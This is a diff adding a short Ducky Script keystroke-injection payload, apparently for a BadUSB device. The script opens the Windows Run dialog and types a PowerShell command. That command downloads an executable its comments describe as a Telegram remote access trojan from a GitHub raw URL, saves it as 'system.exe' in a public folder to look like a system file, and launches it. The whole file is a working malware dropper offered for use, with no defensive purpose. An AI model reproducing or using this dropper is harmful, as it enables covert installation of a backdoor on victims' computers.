@@ -1,0 +1,11 @@
+REM Arthur: Hacker-service
+REM Description: Will download a TelegramRAT EXE file hosted by custom public 
+REM website then execute the EXE file and you will get your connection.
+REM Basicly a dropper for the EXE file.
+DELAY 1000
+GUI r
+DELAY 1500
+STRING powershell -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/WilleLX1/F0_BK/main/CustomRawHosters/BackdoorTelegramFile.exe', 'C:\Users\Public\system.exe'); Start-Process -FilePath 'C:\Users\Public\system.exe'"
+DELAY 500
+ENTER
+REM DONE!
